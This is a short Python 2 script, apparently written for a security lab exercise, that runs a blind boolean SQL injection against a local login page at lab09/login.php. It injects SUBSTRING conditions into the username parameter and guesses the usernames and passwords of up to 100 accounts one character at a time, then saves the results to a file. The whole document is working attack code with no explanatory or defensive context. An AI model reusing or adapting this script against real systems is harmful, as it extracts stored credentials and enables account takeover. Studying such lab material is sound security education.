import urllib

charList =  list(map(chr,range(33,256)))
charList.remove("+")

def checkUser(i,letter,pos):
    request = urllib.urlopen("http://localhost/lab09/login.php?u=%20%22%20or%20id%20=%20"+str(i)+"%20and SUBSTRING(username,"+str(pos)+",1)=%22"+str(letter)+"%22%20--%20")
    body = request.read()
    if "cat" in body:
        return 1
    else:
        return 0

def controlUsername(foundUsername):
    request = urllib.urlopen("http://localhost/lab09/login.php?u="+str(foundUsername)+"%22%20--%20")
    body = request.read()
    if "cat" in body:
        return 1
    else:
        return 0

def checkPass(i,user,letter,pos):
    request = urllib.urlopen("http://localhost/lab09/login.php?u="+str(user)+"%20%22%20and%20id%20=%20"+str(i)+"%20and SUBSTRING(password,"+str(pos)+",1)=%22"+str(letter)+"%22%20--%20")
    body = request.read()
    if "cat" in body:
        return 1
    else:
        return 0

def run():
    f = open("output.txt","w+")
    for i in range(1,101):
        foundUser = ""
        for pos in range(1,50):
            test = 0
            for letter in charList:
                print "Username:",i,pos,letter
                if checkUser(i,letter,pos)==1:
                    test+=1
                    foundUser+=str(letter)
                    break
            if test==0:
                break
        if controlUsername(foundUser)==1:
            foundPass = ""
            for pos in range(1,50):
                test = 0
                for letter in charList:
                    print "Password:",i,pos,letter
                    if checkPass(i,foundUser,letter,pos)==1:
                        test+=1
                        foundPass+=str(letter)
                        break
                if test==0:
                    break
            f.write(str((i,foundUser,foundPass)))
    f.close()

run()
